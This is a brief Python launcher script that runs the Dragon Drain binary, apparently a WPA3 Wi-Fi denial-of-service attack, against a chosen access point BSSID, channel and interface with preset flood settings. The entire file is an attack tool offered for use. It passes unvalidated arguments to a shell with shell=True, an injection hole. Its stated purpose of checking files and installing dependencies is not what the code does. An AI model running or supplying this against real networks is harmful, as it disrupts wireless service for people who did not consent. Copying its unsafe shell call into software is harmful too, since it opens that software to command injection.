#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import subprocess


def run_command(bssid, channel, interface, dragon_drain_path):
	# Dynamically generate the command string with arguments provided
	command = f"{dragon_drain_path} -d {interface} -a {bssid} -c {channel} -b 54 -n 20 -r 200"

	print(f"Command: {command}")
	subprocess.run(command, shell=True, check=True, input=b"\n")

def main():
	parser = argparse.ArgumentParser(description="Script to check file existence, install dependencies, and execute dragon drain command.")
	parser.add_argument("bssid", help="BSSID parameter")
	parser.add_argument("channel", help="Channel parameter")
	parser.add_argument("interface", help="Network interface parameter")
	parser.add_argument("dragon_drain_path", help="Path of the Dragon Drain compiled binary")

	args = parser.parse_args()

	print(f"Received parameters: BSSID={args.bssid}, Channel={args.channel}, Interface={args.interface}, Path={args.dragon_drain_path}")

	run_command(args.bssid, args.channel, args.interface, args.dragon_drain_path)

if __name__ == "__main__":
	main()
